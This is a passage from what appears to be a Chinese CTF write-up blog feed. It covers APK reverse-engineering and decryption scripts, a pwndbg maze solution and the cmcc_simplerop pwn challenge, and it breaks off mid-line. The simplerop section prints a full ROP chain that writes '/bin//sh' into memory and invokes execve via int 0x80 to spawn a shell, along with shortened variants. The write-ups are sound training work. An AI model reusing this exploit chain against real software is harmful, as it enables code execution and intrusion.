class="keyword">in</span> records:</span><br><span class="line">        tid = rec[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        <span class="comment"># quick detect: array-data + sput-object -&gt; static array field</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(<span class="string">&quot;.array-data&quot;</span> <span class="keyword">in</span> l <span class="keyword">for</span> l <span class="keyword">in</span> rec[<span class="string">&quot;body&quot;</span>]) <span class="keyword">and</span> <span class="built_in">any</span>(<span class="string">&quot;sput-object&quot;</span> <span class="keyword">in</span> l <span class="keyword">for</span> l <span class="keyword">in</span> rec[<span class="string">&quot;body&quot;</span>]):</span><br><span class="line">            translated = translate_body(rec[<span class="string">&quot;body&quot;</span>])</span><br><span class="line">            static_fields.extend(translated)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># detect onCreate-like (invoke-super onCreate, setContentView, findViewById etc)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(<span class="string">&quot;onCreate&quot;</span> <span class="keyword">in</span> l <span class="keyword">or</span> <span class="string">&quot;setContentView&quot;</span> <span class="keyword">in</span> l <span class="keyword">for</span> l <span class="keyword">in</span> rec[<span class="string">&quot;body&quot;</span>]):</span><br><span class="line">            body = translate_body(rec[<span class="string">&quot;body&quot;</span>])</span><br><span class="line">            methods.append((<span class="string">&quot;void onCreate(Bundle savedInstanceState /* inferred from smali */)&quot;</span>, body))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># else generic method block</span></span><br><span class="line">        body = translate_body(rec[<span class="string">&quot;body&quot;</span>])</span><br><span class="line">        methods.append((<span class="string">f&quot;/* record_<span class="subst">&#123;tid&#125;</span>_method */ void method_<span class="subst">&#123;tid&#125;</span>()&quot;</span>, body))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print Java-like file</span></span><br><span class="line">    out = []</span><br><span class="line">    out.extend(header)</span><br><span class="line">    <span class="keyword">if</span> static_fields:</span><br><span class="line">        out.append(<span class="string">&quot;    // static fields inferred&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> sf <span class="keyword">in</span> static_fields:</span><br><span class="line">            out.append(<span class="string">&quot;    &quot;</span> + sf)</span><br><span class="line">        out.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> sig, body <span class="keyword">in</span> methods:</span><br><span class="line">        out.append(<span class="string">&quot;    public &quot;</span> + sig + <span class="string">&quot; &#123;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> body:</span><br><span class="line">            out.append(<span class="string">&quot;        // (empty / unrecognized body)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> ln <span class="keyword">in</span> body:</span><br><span class="line">                <span class="comment"># indent translated lines</span></span><br><span class="line">                <span class="keyword">for</span> sub <span class="keyword">in</span> ln.splitlines():</span><br><span class="line">                    out.append(<span class="string">&quot;        &quot;</span> + sub)</span><br><span class="line">        out.append(<span class="string">&quot;    &#125;&quot;</span>)</span><br><span class="line">        out.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    out.extend(footer)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>.join(out))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>得到java源码逆向解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># decrypt_try.py</span></span><br><span class="line"><span class="comment"># 运行前: pip install pycryptodome</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES, DES3, AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">TARGET = <span class="built_in">bytes</span>([<span class="number">118</span>, <span class="number">17</span>, <span class="number">7</span>, <span class="number">124</span>, <span class="number">157</span>, <span class="number">51</span>, <span class="number">23</span>, <span class="number">133</span>, <span class="number">178</span>, <span class="number">23</span>, <span class="number">203</span>, <span class="number">1</span>, <span class="number">42</span>, <span class="number">109</span>, <span class="number">179</span>, <span class="number">5</span>, <span class="number">169</span>, <span class="number">10</span>, <span class="number">179</span>, <span class="number">106</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">123</span>, <span class="number">138</span>, <span class="number">209</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">115</span>, <span class="number">151</span>, <span class="number">245</span>, <span class="number">218</span>, <span class="number">238</span>, <span class="number">184</span>, <span class="number">12</span>, <span class="number">42</span>, <span class="number">17</span>, <span class="number">55</span>, <span class="number">135</span>, <span class="number">212</span>, <span class="number">119</span>, <span class="number">215</span>, <span class="number">87</span>, <span class="number">118</span>, <span class="number">95</span>, <span class="number">180</span>, <span class="number">172</span>, <span class="number">69</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从反编译看到的 key/iv 字符串</span></span><br><span class="line">key_str = <span class="string">b&quot;1234567891123456&quot;</span>  <span class="comment"># 16 bytes</span></span><br><span class="line">iv_str = <span class="string">b&quot;1234567891123456&quot;</span>   <span class="comment"># 16 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;TARGET length:&quot;</span>, <span class="built_in">len</span>(TARGET))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;TARGET hex:&quot;</span>, binascii.hexlify(TARGET).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_aes_128_cbc</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cipher = AES.new(key_str, AES.MODE_CBC, iv=iv_str[:<span class="number">16</span>])</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), AES.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nAES-128-CBC -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nAES-128-CBC -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_des_cbc_with_truncated_key</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k = key_str[:<span class="number">8</span>]</span><br><span class="line">        iv = iv_str[:<span class="number">8</span>]</span><br><span class="line">        cipher = DES.new(k, DES.MODE_CBC, iv=iv)</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), DES.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nDES-CBC (key=first8, iv=first8) -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key (hex):&quot;</span>, binascii.hexlify(k).decode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nDES-CBC -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_des_ecb_truncated_key</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k = key_str[:<span class="number">8</span>]</span><br><span class="line">        cipher = DES.new(k, DES.MODE_ECB)</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), DES.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nDES-ECB (key=first8) -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nDES-ECB -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_3des_cbc_with_16byte_key_padded</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k16 = key_str</span><br><span class="line">        k24 = k16 + k16[:<span class="number">8</span>]  <span class="comment"># 常用的 from-16-to-24 扩展</span></span><br><span class="line">        iv = iv_str[:<span class="number">8</span>]</span><br><span class="line">        cipher = DES3.new(k24, DES3.MODE_CBC, iv=iv)</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), DES3.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n3DES-CBC (16-&gt;24 padded) -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key24 hex:&quot;</span>, binascii.hexlify(k24).decode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n3DES-CBC -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_3des_cbc_with_24byte_key</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k24 = (key_str * <span class="number">2</span>)[:<span class="number">24</span>]</span><br><span class="line">        iv = iv_str[:<span class="number">8</span>]</span><br><span class="line">        cipher = DES3.new(k24, DES3.MODE_CBC, iv=iv)</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), DES3.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n3DES-CBC (constructed 24) -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key24 hex:&quot;</span>, binascii.hexlify(k24).decode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n3DES-CBC (constructed 24) -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行尝试</span></span><br><span class="line">try_aes_128_cbc()</span><br><span class="line">try_des_cbc_with_truncated_key()</span><br><span class="line">try_des_ecb_truncated_key()</span><br><span class="line">try_3des_cbc_with_16byte_key_padded()</span><br><span class="line">try_3des_cbc_with_24byte_key()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nDone.&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;just_easy_strange_app_right?&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SCTF2019-Strange-apk-Xposed安装以及反射大师安装"><a href="#SCTF2019-Strange-apk-Xposed安装以及反射大师安装" class="headerlink" title="[SCTF2019]Strange apk(Xposed安装以及反射大师安装)"></a>[SCTF2019]Strange apk(Xposed安装以及反射大师安装)</h2><p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" alt="1"></p>
<p>是个输入flag验证的题目。</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" alt="1"></p>
<p>用jeb打开可以发现真的入口点是sctf.demo.myapplication.t，但是我们只看到了sctf.demo.myapplication.s所以我们知道app动态释放文件</p>
<p>我们要下载Xposed和反射大师这个下载太难搞了~~~~</p>
<p>记录一下步骤</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" alt="1"></p>
<p>点击激活在点击上方三条杠选择模版，首要是你已经安装了反射大师。</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" alt="1"></p>
<p>打开反射大师,按照一下步骤</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" alt="1"></p>
<p>然后打开windows的共享文件夹就可以得到dex文件。</p>
<p>在用jeb打开</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" alt="1"></p>
<p>第一部分解base64,第二部分去8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W3lc0me~t0_An4r0id-w0rld&#125;</span><br></pre></td></tr></table></figure>

<p>这题也可以直接用脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    key = <span class="string">&quot;syclover&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        encrypted_data = f.read()</span><br><span class="line"></span><br><span class="line">    decrypted_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_data)):</span><br><span class="line">        decrypted_data.append(encrypted_data[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_file = <span class="string">&quot;data&quot;</span>  <span class="comment"># 指定输入的加密文件路径</span></span><br><span class="line">    output_file = <span class="string">&quot;sctf.apk&quot;</span>  <span class="comment"># 输出解密后的APK文件</span></span><br><span class="line">    decrypt_data(input_file, output_file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密完成，APK已保存为 <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="BSidesSF2019-blink"><a href="#BSidesSF2019-blink" class="headerlink" title="[BSidesSF2019]blink"></a>[BSidesSF2019]blink</h2><p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/18.png" alt="1"></p>
<p>这个就记录一下查壳把，答案base64转图片就成了。</p>
]]></content>
      <categories>
        <category>reverse</category>
        <category>apk逆向</category>
      </categories>
  </entry>
  <entry>
    <title>easy_Maze(迷宫在内存中,用pwndbg)</title>
    <url>/2025/03/20/easy-Maze-%E8%BF%B7%E5%AE%AB%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD-%E7%94%A8pwndbg/</url>
    <content><![CDATA[<p>直接记重点，怎么用pwndbg找内存中的迷宫</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb 文件名</span><br><span class="line">b Step_1 #把段点下在Step_1</span><br><span class="line">r  #开始运行</span><br><span class="line">finish #返回主函数，此时Step_1的函数已经执行完了</span><br></pre></td></tr></table></figure>

<ul>
<li>x：查看内存</li>
<li>49：49个单元</li>
<li>d：按照10进制查看</li>
<li>w：四个字节为一个单元（int）</li>
<li>$rsp：内存地址在rsp中</li>
</ul>
<p>最终查内存的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x /49dw $rsp#其他题根据具体情况自己调整</span><br></pre></td></tr></table></figure>

<p><img src="/2025/03/20/easy-Maze-%E8%BF%B7%E5%AE%AB%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD-%E7%94%A8pwndbg/1.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 0 0 1 1 1 1</span><br><span class="line">1 0 1 1 0 0 1</span><br><span class="line">1 1 1 0 1 1 1</span><br><span class="line">0 0 0 1 1 0 0</span><br><span class="line">1 1 1 1 0 0 0</span><br><span class="line">1 0 0 0 1 1 1</span><br><span class="line">1 1 1 1 0 1 1</span><br></pre></td></tr></table></figure>

<p>然后我在写下本题的思路step_0和step_1都是构造迷宫。我们已经通过动态调试得到了，感觉还可以就是自己模拟伪代码构造出迷宫，但是我能力有限，以后再试试。</p>
<p>step_2大概得意思就是w上，s下，a左，d右的意思，然后都要走1</p>
<p><img src="/2025/03/20/easy-Maze-%E8%BF%B7%E5%AE%AB%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD-%E7%94%A8pwndbg/2.png" alt="2"></p>
<p>最后得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNCTF&#123;ssddwdwdddssaasasaaassddddwdds&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>cmcc_simplerop</title>
    <url>/2025/02/26/cmcc-simplerop/</url>
    <content><![CDATA[<p>写这题的目的</p>
<ol>
<li><p>当IDA显示的偏移错误，怎么动态调试</p>
</li>
<li><p>用ROP构造的rop链过长，怎么简化</p>
</li>
</ol>
<p>这题主要写这两个问题，其余的与<a href="https://linkpwn.github.io/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/">BUUCTF_inndy_rop(rop链)</a>差不多</p>
<h3 id="动态调试找到正确的偏移"><a href="#动态调试找到正确的偏移" class="headerlink" title="动态调试找到正确的偏移"></a>动态调试找到正确的偏移</h3><ol>
<li><p>先用cyclic生成200(数目不固定)字母</p>
<p><img src="/2025/02/26/cmcc-simplerop/1.png" alt="1"></p>
</li>
<li><p>再动态调试</p>
</li>
</ol>
<p>​     <img src="/2025/02/26/cmcc-simplerop/2.png" alt="1"></p>
<p>​    <img src="/2025/02/26/cmcc-simplerop/3.png" alt="3"></p>
<p>   <img src="/2025/02/26/cmcc-simplerop/4.png" alt="4"></p>
<p>  <img src="/2025/02/26/cmcc-simplerop/5.png" alt="5"></p>
<p>   <img src="/2025/02/26/cmcc-simplerop/6.png" alt="6"></p>
<p>   可以得到偏移是32</p>
<ol start="2">
<li><p>化简ROP链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>

<p>还是用这个工具生成ROP链<br>然后参考<a href="https://blog.csdn.net/W13680336969/article/details/137062020">佬的博客</a>进行修改<br>原本是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27; </span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08054250) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e851) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # padding without overwrite ebx</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08054250) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080493e1) # int 0x80</span><br></pre></td></tr></table></figure>

<ol>
<li>我们可以用ROPgadget命令查找可以修改ebx,edx,ecx寄存器的gadget<br><img src="/2025/02/26/cmcc-simplerop/7.png" alt="7"></li>
</ol>
</li>
</ol>
<p>​          化简1：<br>​        <code> ​            p += pack(&#39;&lt;I&#39;, 0x0806e82a) # pop edx ; ret ​            p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data ​            p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret ​            p += b&#39;/bin&#39;  ​            p += pack(&#39;&lt;I&#39;, 0x0809a15d) # mov dword ptr [edx], eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0806e82a) # pop edx ; ret ​            p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4 ​            p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret ​            p += b&#39;//sh&#39; ​            p += pack(&#39;&lt;I&#39;, 0x0809a15d) # mov dword ptr [edx], eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret ​            p += p32(0)+p32(0)+p32(0x080ea060)  ​            p += pack(&#39;&lt;I&#39;, 0x080ea060) # padding without overwrite ebx ​            p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 ​            p += pack(&#39;&lt;I&#39;, 0x08054250) # xor eax, eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x0807b27f) # inc eax ; ret ​            p += pack(&#39;&lt;I&#39;, 0x080493e1) # int 0x80 ​       </code></p>
<ol start="2">
<li>p +&#x3D; pack(‘&lt;I’, 0x0807b27f) # inc eax ; ret一直在重复，我们可以利用pop eax,ret 实现设置eax的值为11（0xB）</li>
</ol>
<p>   化简2：<br>   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27; </span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">p += p32(0)+p32(0)+p32(0x080ea060) </span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # padding without overwrite ebx</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += 